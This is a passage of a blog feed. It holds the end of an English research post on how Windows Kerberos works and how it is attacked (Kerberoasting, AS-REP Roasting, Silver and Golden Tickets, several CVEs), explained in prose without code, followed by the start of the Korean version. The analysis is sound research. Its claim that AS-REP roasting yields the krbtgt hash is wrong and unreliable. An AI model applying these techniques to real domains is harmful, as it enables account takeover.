like this:</p><p>It&#x2019;s a bit of a headache, but let&#x2019;s go through it one by one.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/2.png" alt></p><p><strong>1) AS-REQ</strong></p><p>In an AS-REQ, the client requests a ticket with its identity from the KDC&#x2019;s authentication service. By Windows default, with preauthentication, the user sends the current time encrypted with their secret key (NTLM hash). The KDC decrypts this with the user&#x2019;s NTLM hash, which is stored in the domain controller (DC), to authenticate the user.</p><p><strong>2) AS-REP</strong> </p><p>If the verification in AS-REQ is successful, the client is issued a TGT and a session key (client-TGS) in the AS-REP response. The session key is encrypted with the user&#x2019;s NTLM hash, and the TGT is encrypted with the KDC&#x2019;s master key (the NTLM hash of the krbtgt account), so the client cannot decrypt the TGT.</p><p><strong>3) TGS-REQ</strong> </p><p>When a client needs access to a service server, it sends the TGT in a TGS-REQ message to the TGS in the KDC. The request also includes the SPN of the target service and the previously issued client-TGS session key.</p><p><strong>4) TGS-REP</strong></p><p>The KDC receives the TGS-REQ and verifies that the TGT is valid. The TGT is encrypted with the KDC&#x2019;s master key, so the KDC can decrypt it and verify it.</p><p>And if the user is authorized to access the requested service and there are no problems, it sends a TGS-REP response to the client.</p><p>This includes a session key (client-service server) and a service ticket (ST).</p><p>The service ticket is encrypted with the secret key of the service account (the NTLM hash of the service account), so only the <strong>service</strong> can decrypt and view it, the client does not know the contents. The client will keep this ST and use it to access the actual service.</p><p><strong>5) AP-REQ</strong></p><p>Finally, the client tries to connect by presenting the AP-REQ to the target server (service) with the service ticket. To prove its identity, the client also sends the authenticator (Authenticator, timestamp, etc.) encrypted with the service session key it received earlier.</p><p>The server sends a KERB_VERIFY_PAC message to the domain controller to validate the signature of the PAC in the service ticket. This PAC is protected by the KDC&#x2019;s signature, and the service verifies the integrity of the PAC when validating the ticket so that it can trust the user&#x2019;s authorization in the domain.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/3.png" alt></p><p><strong>6) AP-REP</strong> </p><p>The service server verifies the PAC of the service ticket presented by the client, and if the verification is successful, the server sends a response to the client in an AP-REP message to complete the session key negotiation. The client is then allowed to access the service.</p><hr><p>As you can see from the description, Kerberos authentication on Windows is based on the fact that the secret key shared with each other is the user&#x2019;s NTLM hash, the authorization information, called the PAC, is contained in the ticket, and the PAC is signed by the KDC to ensure its integrity.</p><h1 id="Kerberos-related-attacks"><a href="#Kerberos-related-attacks" class="headerlink" title="Kerberos-related attacks"></a>Kerberos-related attacks</h1><p>The Kerberos protocol itself is designed to be secure, but various attack techniques have been studied depending on the implementation settings and operating environment. Let&#x2019;s take a look at the most common attacks in the Windows Kerberos environment.</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Kerberoasting is an attack technique that uses a legitimate domain user account to request a Kerberos ticket for a <strong>service account</strong> and then cracks the encrypted information contained in the ticket to steal the service account&#x2019;s password.</p><p>Any user inside an AD domain can request a service ticket via TGS-REQ for an account with an SPN attribute, which means that an attacker can use this technique if they have already penetrated the domain.</p><p>The service ticket is encrypted with an NTLM hash, so if the crack is successful, the NTLM hash is obtained, which is no different than obtaining a password in a Windows environment.</p><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p><strong>AS-REP Roasting</strong> is a technique similar to Kerberoasting, but targets users who have Kerberos Pre-Authentication disabled.</p><p>Pre-authentication is the process of verifying that the client knows the shared key before a TGT is issued.</p><p>If the option &#x201C;Do not require Kerberos pre-authentication&#x201D; is set in the AD account properties, TGTs are issued without pre-authentication, meaning that a password is not required to obtain a TGT.</p><p>The TGT is encrypted with the master key of the KDC, which is the NTLM hash of the krbtgt account, so if you successfully crack the TGT, you can take over the privileges of the krbtgt account.</p><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>If you have the NTLM hash of a specific service account, you can use it to create another service ticket that manipulates the PAC.</p><p>Service tickets are originally issued by TGS, but it is possible to create service tickets without going through TGS.</p><p>The PAC in the service ticket is signed with two keys: the service account secret key and the krbtgt account secret key, but in some cases, only the service account secret key signature is verified.</p><p>For example, an account with the SeTcbPrivilege privilege is eligible for a Silver Ticket because only the service account secret key signature is verified.</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>Once you have the NTLM hash of the krbtgt account, you can create a TGT. This TGT also contains a PAC, and while the Silver Ticket manipulated the PAC of the service ticket, the Golden Ticket manipulates the PAC of the TGT.</p><p>When the TGT with the manipulated PAC is delivered to the TGS, the service ticket is issued with the corresponding privilege, so it can be used to elevate to higher privileges, such as domain administrator.</p><h1 id="Kerberos-related-vulnerabilities"><a href="#Kerberos-related-vulnerabilities" class="headerlink" title="Kerberos-related vulnerabilities"></a>Kerberos-related vulnerabilities</h1><p>The Kerberos protocol is very complex and it is difficult to introduce all the related features implemented in Windows. Therefore, let&#x2019;s take a look at a few CVEs to understand the details and the vulnerabilities that occurred.</p><h2 id="CVE-2020-17049"><a href="#CVE-2020-17049" class="headerlink" title="CVE-2020-17049"></a>CVE-2020-17049</h2><p>CVE-2020-17049 is a security vulnerability found in the Kerberos Delegation mechanism, known as a &#x201C;Bronze Bit&#x201D; attack.</p><p>Delegation is literally a delegation. For example, let&#x2019;s say a user authenticates to a web application, and the web application needs to access a database based on the user&#x2019;s permissions. There are several implementations of Kerberos Delegation to support this (Unconstrained Delegation, Constrained Delegation, Do Not Delegate, etc.)</p><p>The AllowedToDelegateTo property, which specifies the services that can be delegated to, is used to store information that a service A can delegate to another service B. This is called the Forwardable Flag in the service ticket.</p><p>The Forwardable Flag in a service ticket is a bit that indicates whether this ticket is relayable, and if Forwardable is 1, it means that the authorization can be delegated. So if the Kerberos Delegation option is Do Not Delegate or AllowedToDelegateTo is not defined, Forwardable is 0.</p><p>But the Forwardable bit is not protected by the KDC&#x2019;s signature, the service&#x2019;s signature, or anything else, so it can be tampered with.</p><p>At this point, do you have any idea what this CVE is?</p><p>If you manipulate the Forwardable Flag in a service ticket and send it to a service, you can force the service to delegate privileges even if it is not delegating privileges, which can lead to a privilege takeover.</p><p>In Windows, Kerberos Contained Delegation (MS-SFU) implements authorization delegation with the S4U2proxy protocol. If service A is delegated to service B, it is impossible to make a request to service B using only A&#x2019;s service ticket. You need to present the A service ticket to the KDC via S4U2proxy and get the B service ticket.</p><p>This is a vulnerability that can be exploited by setting the Forwardable flag to 1 to force delegation of authorization.</p><h2 id="CVE-2022-33647-amp-CVE-2022-33679"><a href="#CVE-2022-33647-amp-CVE-2022-33679" class="headerlink" title="CVE-2022-33647 &amp; CVE-2022-33679"></a>CVE-2022-33647 &amp; CVE-2022-33679</h2><p><strong>CVE-2022-33647</strong> and <strong>CVE-2022-33679</strong> are vulnerabilities discovered by James Forshaw of Google&#x2019;s Project Zero that allow the use of RC4 encryption during the Kerberos authentication process, which can be used to decrypt session keys and gain privileges using methods such as brute force. The vulnerability trigger forces the use of RC4 because Kerberos natively prefers AES-based encryption but supports the RC4-HMAC (MD4) method due to backward compatibility.</p><p>When a client passes an AS-REQ to a KDC, it can use an integer field called etype to specify the supported encryption algorithms. The server will check for supported ciphers and, if available, will use the cipher specified by the client.</p><p>The idea Forshaw used to exploit CVE-2022-33647 is amazing, let&#x2019;s take a look:</p><p>When a client authenticates, it typically sends a request to the KDC without a pre-authentication timestamp. The KDC then returns with an error code called KDC_ERR_PREAUTH_REQUIRED. This error response includes a list of required ciphers so that the client can perform the appropriate encryption. MITM intercepts the client&#x2019;s AS-REQ and returns an error, and includes information about RC4-MD4 in the error to force the client to use RC4-MD4. Relay the RC4-enabled AS-REQ to the KDC to receive the AS-REP.</p><p>Now, the attacker has the RC4-enabled AS-REQ and the encrypted session key and TGT contained in the AS-REP. The AS-REQ has a timestamped structure called PA-ENC-TS-ENC, and the AS-REP has an encrypted response structure called EncASRepPart.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/4.png" alt></p><p>RC4 does an XOR with the generated stream key, so if you know the ciphertext and the plaintext, you know the stream key. This is computable except when both sides are yellow in the above figure:</p><ul><li>The RC4-MD4 method generates and uses a 16-byte key, where only the first 5 bytes are random and the 11th byte is fixed at 0xAB.</li></ul><p>The green markings are values we know or can compute because they are ASN.1 structures. We&#x2019;re lucky enough to have about 4 bytes of the session key overlap, so we can decrypt it, and 1 byte needs to be brute-forced. Bruteforcing can be done by requesting a service ticket from the KDC 256 times to get a legitimate service ticket.  This allows him to obtain the session key, decrypt the ticket, and take over the user&#x2019;s privileges.</p><p>The case of CVE-2022-33679 occurs when pre-authentication in Keberos is disabled. If an account has pre-authentication disabled, an attacker can send an AS-REQ request directly to the KDC for that account to request a TGT over RC4-MD4. Because pre-authentication is turned off, the KDC will return the RC4-encrypted TGT and session key via AS-REP even though the user has not proven their password.</p><p>To exploit this vulnerability, instead of obtaining the session key, we use oracle padding to append a null value to the back of the timestamp and obtain the key if the KDC responds with a valid response.</p><h2 id="CVE-2022-37966"><a href="#CVE-2022-37966" class="headerlink" title="CVE-2022-37966"></a>CVE-2022-37966</h2><p>CVE-2022-37966 is a vulnerability announced at Black Hat Europe 2022 that allows verification bypass via MD5 collision after PAC tampering when using the RC4_HMAC_MD5 algorithm, which was natively supported in Kerberos at the time.</p><p>There is no controllable field in the PAC that can be used to insert arbitrary bytes, but the LogonScript field can be used to insert a long UTF-16 string, which can be used to trigger an MD5 collision.</p><p>To exploit this vulnerability, you need to create a PAC with domain administrator privileges that has the same MD5 hash, which in our research took about 7 hours with HashClash. Once created, you can get domain administrator privileges, so it seems to be worth the time.</p><h2 id="CVE-2024-43639"><a href="#CVE-2024-43639" class="headerlink" title="CVE-2024-43639"></a>CVE-2024-43639</h2><p>CVE-2024-43639 is a vulnerability reported to ZDI, which is a Heap Overflow vulnerability due to Integer Overflow in KDC Proxy (kdcsvc).</p><p>Windows KDC Proxy is a Windows Server component that proxies Kerberos protocol messages over HTTP. It occurs in kpssvc.dll, which runs a service called kdcsvc.</p><p>I&#x2019;ve been looking at Kerberos protocol logical bugs all the time, so it&#x2019;s kind of refreshing to see a memory corruption bug.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><strong>Conclusion</strong></h1><p>We&#x2019;ve covered how Kerberos works, the Windows implementation, and related attacks and vulnerabilities. Kerberos is a strong authentication protocol, but misconfigurations and implementation gaps can expose it to a variety of attacks and vulnerabilities. The topic for the next installment is still undecided, but we&#x2019;ll be back with something interesting. Thanks for reading &#x1F642;</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><p><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol">https://en.wikipedia.org/wiki/Kerberos_(protocol)</a>)</p></li><li><p><a href="https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication">https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication</a></p></li><li><p><a href="https://www.varonis.com/blog/kerberos-attack-silver-ticket">https://www.varonis.com/blog/kerberos-attack-silver-ticket</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8">https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos">https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos</a></p></li><li><p><a href="https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/">https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/</a></p></li><li><p><a href="https://www.hackthebox.com/blog/as-rep-roasting-detection">https://www.hackthebox.com/blog/as-rep-roasting-detection</a></p></li><li><p><a href="https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/">https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/</a></p></li><li><p><a href="https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html">https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html</a></p></li><li><p><a href="https://syfuhs.net/a-bit-about-kerberos">https://syfuhs.net/a-bit-about-kerberos</a></p></li><li><p><a href="https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf">https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf</a></p></li><li><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/">https://www.thehacker.recipes/ad/movement/kerberos/</a></p></li><li><p><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/">https://en.hackndo.com/kerberos-silver-golden-tickets/</a></p></li><li><p><a href="https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/">https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview">https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview</a></p></li><li><p><a href="https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/">https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926</a></p></li><li><p><a href="https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639">https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Authentication/">Authentication</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kerberos/">Kerberos</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Authentication Series (Part2. Kerberos)(KR)</title>
      <link>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/ko/</link>
      <guid>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/ko/</guid>
      <pubDate>Mon, 21 Apr 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. Windows Authentication Series &#xB85C; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xBD59;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Part1 NTLM &#xB54C;&#xB294; Part2 &#xB54C; NTLM &#xAD00;&#xB828; CVE &#xB97C; &#xC0B4;&#xD3B4;&#xBCFC; &#xC608;&#xC815;&#xC774;&#xB77C;&#xACE0; &#xD588;&#xC5C8;&#xB294;&#xB370;&#xC694;. NTLM &#xAD00;&#xB828; CVE&#xB97C; &#xB2E4;&#xB8E8;&#xB294; &#xAC83;&#xB3C4; &#xC88B;&#xC9C0;&#xB9CC; Windows &#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Kerberos &#xC778;&#xC99D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xB2E4;&#xB904;&#xBD10;&#xC57C;&#xACA0;&#xB2E4; &#xC2F6;&#xC5B4;&#xC11C; &#xB0B4;&#xC6A9;&#xC744; &#xC900;&#xBE44;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Kerberos &#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC791;&#xB3D9; &#xC6D0;&#xB9AC;&#xBD80;&#xD130; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xC758; &#xAD6C;&#xD604; &#xBC29;&#xC2DD;, Kerberos &#xAD00;&#xB828; &#xACF5;&#xACA9;&#xACFC; &#xAD00;&#xB828; CVE &#xCDE8;&#xC57D;&#xC810; &#xBA87; &#xC885;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xAC00;&#xC838;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Kerberos-&#xC778;&#xC99D;"><a href="#Kerberos-&#xC778;&#xC99D;" class="headerlink" title="Kerberos &#xC778;&#xC99D;"></a>Kerberos &#xC778;&#xC99D;</h1><p>Kerberos &#xB294; &#xD2F0;&#xCF13; &#xAE30;&#xBC18;&#xC758; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC740; KDC &#xB97C; &#xD1B5;&#xD574; &#xB300;&#xCE6D; &#xD0A4; &#xC554;&#xD638;&#xD654; &#xAE30;&#xBC18;&#xC758; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC790;&#xCCB4;&#xB97C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xB178;&#xCD9C;&#xD558;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC0C1;&#xD638; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xAC8C; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC778;&#xC99D; &#xAD6C;&#xC870;&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC694;&#xC18C;&#xAC00; &#xB4F1;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>KDC (Key Distribution Center): &#xD0A4; &#xBC30;&#xD3EC; &#xC13C;&#xD130;, AS &#xC640; TGS &#xB97C; &#xBB36;&#xC740; &#xC694;&#xC18C;&#xB85C; &#xC778;&#xC99D; &#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5; &#xBC0F; &#xC138;&#xC158;&#xD0A4; &#xC0DD;&#xC131;, &#xBD84;&#xBC30;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>AS (Authentication Server): &#xC778;&#xC99D; &#xC11C;&#xBC84;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; TGS&#xC758; &#xBE44;&#xBC00;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; TGT&#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.</li><li>TGS (Ticket Granting Server): &#xD2F0;&#xCF13; &#xBD80;&#xC5EC; &#xC11C;&#xBC84;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; TGT&#xB97C; TGS &#xC5D0; &#xBCF4;&#xB0B4;&#xBA74; ST &#xC640; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.</li><li>TGT (Ticket Granting Ticket): &#xD2F0;&#xCF13; &#xBD80;&#xC5EC; &#xD2F0;&#xCF13;, TGS &#xC5D0;&#xC11C; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xD2F0;&#xCF13;&#xC785;&#xB2C8;&#xB2E4;.</li><li>ST (Service Ticket): &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC774;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xD2F0;&#xCF13;&#xC785;&#xB2C8;&#xB2E4;.</li><li>SS (Service Server): &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p>Kerberos &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; AS &#xC5D0; &#xC778;&#xC99D; &#xC694;&#xCCAD;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</li><li>AS &#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; TGT &#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.<ol><li>&#xC774; &#xB54C;, TGT&#xB294; TGS &#xC758; &#xBE44;&#xBC00;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654; &#xB429;&#xB2C8;&#xB2E4;.</li><li>AS, TGS &#xB294; KDC&#xB85C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xAC19;&#xC740; &#xD638;&#xC2A4;&#xD2B8;&#xB97C; &#xACF5;&#xC720;&#xD569;&#xB2C8;&#xB2E4;.</li></ol></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00;  TGT &#xC640; &#xC694;&#xCCAD;&#xD560; &#xC11C;&#xBE44;&#xC2A4;&#xC758; ID &#xB97C; TGS &#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>TGS &#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; ST &#xB97C; &#xBC1C;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.<ol><li>&#xC774; &#xB54C;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC811;&#xADFC; &#xC694;&#xCCAD;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB294; SPN (Service Principal Name) &#xC73C;&#xB85C; TGS&#xC5D0; &#xB4F1;&#xB85D;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ol></li><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; ST&#xB97C; &#xC11C;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD1B5;&#xC2E0;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704; &#xACFC;&#xC815;&#xC744; &#xB3C4;&#xC2DD;&#xD654;&#xD55C; &#xADF8;&#xB9BC;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/1.png" alt></p><h2 id="Windows&#xC5D0;&#xC11C;&#xC758;-Kerberos-&#xC778;&#xC99D;"><a href="#Windows&#xC5D0;&#xC11C;&#xC758;-Kerberos-&#xC778;&#xC99D;" class="headerlink" title="Windows&#xC5D0;&#xC11C;&#xC758; Kerberos &#xC778;&#xC99D;"></a>Windows&#xC5D0;&#xC11C;&#xC758; Kerberos &#xC778;&#xC99D;</h2><p>Windows Kerberos &#xAD6C;&#xD604;&#xC5D0;&#xC11C;&#xB294; &#xD2F0;&#xCF13;&#xC5D0; PAC (Privilege Attribute Certificate) &#xB77C;&#xB294;&#xAC8C; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. PAC &#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xADF8;&#xB8F9; &#xC815;&#xBCF4;&#xC640; &#xAD8C;&#xD55C; &#xB370;&#xC774;&#xD130; &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294;&#xB370;&#xC694;. KDC&#xAC00; &#xC774; &#xC815;&#xBCF4;&#xB97C; &#xC11C;&#xBA85;&#xD558;&#xC5EC; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;&#xB294; &#xD2F0;&#xCF13;&#xC774; &#xC624;&#xBA74; PAC&#xB97C; &#xBCF4;&#xACE0; &#xAD8C;&#xD55C;&#xC744; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC811;&#xADFC;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xAC70;&#xB098; &#xAC70;&#xBD80;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>&#xC790;, Windows &#xC5D0;&#xC11C;&#xB294; &#xC704;&#xC5D0;&#xC11C; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xBA85;&#xD55C; Kerberos &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC744; &#xB2E4;&#xC74C; &#xADF8;&#xB9BC;&#xCC98;&#xB7FC; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;&#xC694;. </p><p>&#xBA38;&#xB9AC;&#xAC00; &#xC544;&#xD504;&#xC9C0;&#xB9CC; &#xD558;&#xB098;&#xD558;&#xB098; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/2.png" alt></p><p><strong>1) AS-REQ</strong></p><p>AS-REQ &#xC5D0;&#xC11C;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; KDC &#xC758; &#xC778;&#xC99D; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC790;&#xC2E0;&#xC758; ID&#xB85C; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. Windows &#xAE30;&#xBCF8; &#xC124;&#xC815; &#xC0C1;, &#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD604;&#xC7AC; &#xC2DC;&#xAC01;&#xC744; &#xC790;&#xC2E0;&#xC758; &#xBE44;&#xBC00;&#xD0A4; (NTLM hash) &#xB85C; &#xC554;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. KDC&#xB294; DC(Domain Controller) &#xC5D0; &#xBCF4;&#xAD00;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; NTLM hash &#xB85C; &#xC774;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC778;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>2) AS-REP</strong> </p><p>AS-REQ &#xC5D0;&#xC11C; &#xAC80;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; AS-REP &#xC751;&#xB2F5;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; <strong>TGT&#xC640; 